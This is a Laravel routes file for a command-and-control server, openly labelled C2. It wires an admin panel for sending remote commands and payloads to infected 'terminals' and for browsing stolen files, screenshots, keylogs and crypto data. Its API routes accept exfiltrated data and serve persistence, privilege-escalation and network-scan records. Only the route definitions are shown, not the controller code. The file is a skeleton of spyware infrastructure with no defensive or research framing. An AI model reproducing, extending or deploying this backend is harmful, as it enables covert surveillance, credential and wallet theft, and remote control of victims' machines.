<?php

use Illuminate\Support\Facades\Route;

// Home
Route::get('/', function () {
    return view('welcome');
});

// Admin Routes
Route::get('/admin', function () {
    return redirect('/admin/dashboard');
})->name('admin');
Route::get('/admin/dashboard', [App\Http\Controllers\Admin\AdminController::class, 'index'])->name('admin.dashboard');
Route::get('/admin/client/{id}', [App\Http\Controllers\Admin\AdminController::class, 'clientManage'])->name('admin.client');
Route::post('/admin/command', [App\Http\Controllers\Admin\AdminController::class, 'remoteCommand'])->name('admin.command');
Route::post('/admin/upload-payload', [App\Http\Controllers\Admin\AdminController::class, 'uploadAndSendPayload'])->name('admin.upload');
Route::get('/admin/terminal-details', [App\Http\Controllers\Admin\AdminController::class, 'terminalDetails'])->name('admin.terminal.details');
Route::get('/admin/files/{terminalId}', [App\Http\Controllers\Admin\AdminController::class, 'listFiles'])->name('admin.files.list');
Route::get('/admin/files/{terminalId}/{filename}', [App\Http\Controllers\Admin\AdminController::class, 'downloadFile'])->name('admin.files.download');
Route::get('/admin/screenshots/{terminalId}', [App\Http\Controllers\Admin\AdminController::class, 'screenshotsView'])->name('admin.screenshots');
Route::get('/admin/keylogs/{terminalId}', [App\Http\Controllers\Admin\AdminController::class, 'keylogsView'])->name('admin.keylogs');
Route::get('/admin/crypto/{terminalId}', [App\Http\Controllers\Admin\AdminController::class, 'cryptoView'])->name('admin.crypto');
Route::get('/admin/telemetry/{terminalId}', [App\Http\Controllers\Admin\AdminController::class, 'telemetryView'])->name('admin.telemetry');
Route::get('/admin/export/{terminalId}/{type}', [App\Http\Controllers\Admin\AdminController::class, 'exportData'])->name('admin.export');

// API Routes for C2
Route::prefix('api')->group(function () {
    // Terminal communication
    Route::post('/status', [App\Http\Controllers\Api\C2Controller::class, 'statusUpdate']);
    Route::post('/upload', [App\Http\Controllers\Api\C2Controller::class, 'upload']);
    Route::post('/systeminfo', [App\Http\Controllers\Api\C2Controller::class, 'systemInfo']);
    Route::post('/exfiltrate', [App\Http\Controllers\Api\C2Controller::class, 'exfiltrate']);
    
    // Data retrieval
    Route::get('/terminals', [App\Http\Controllers\Api\C2Controller::class, 'listTerminals']);
    Route::get('/livefeed/{id}', [App\Http\Controllers\Api\C2Controller::class, 'getLiveFeed']);
    Route::get('/screenshots/{terminalId}', [App\Http\Controllers\Api\C2Controller::class, 'getScreenshots']);
    Route::get('/keylogs/{terminalId}', [App\Http\Controllers\Api\C2Controller::class, 'getKeylogs']);
    Route::get('/crypto/{terminalId}', [App\Http\Controllers\Api\C2Controller::class, 'getCryptoData']);
    Route::get('/telemetry/{terminalId}', [App\Http\Controllers\Api\C2Controller::class, 'getTelemetry']);
    Route::get('/timeline/{terminalId}', [App\Http\Controllers\Api\C2Controller::class, 'getTimeline']);
    Route::get('/persistence/{terminalId}', [App\Http\Controllers\Api\C2Controller::class, 'getPersistenceAttempts']);
    Route::get('/escalation/{terminalId}', [App\Http\Controllers\Api\C2Controller::class, 'getEscalationAttempts']);
    Route::get('/network-scans/{terminalId}', [App\Http\Controllers\Api\C2Controller::class, 'getNetworkScans']);
    
    // WebRTC
    Route::post('/webrtc/register', [App\Http\Controllers\Api\C2Controller::class, 'webrtcRegister']);
    Route::post('/webrtc/heartbeat', [App\Http\Controllers\Api\C2Controller::class, 'webrtcHeartbeat']);
    Route::get('/webrtc/commands/{sessionId}', [App\Http\Controllers\Api\C2Controller::class, 'webrtcPollCommands']);
    Route::post('/webrtc/result', [App\Http\Controllers\Api\C2Controller::class, 'webrtcResult']);
    
    // Telemetry
    Route::post('/telemetry/batch', [App\Http\Controllers\Api\C2Controller::class, 'receiveTelemetryBatch']);
    Route::post('/logs', [App\Http\Controllers\Api\C2Controller::class, 'storeLogs']);
    
    // Updates
    Route::get('/updates/check', [App\Http\Controllers\Api\C2Controller::class, 'checkForUpdates']);
});
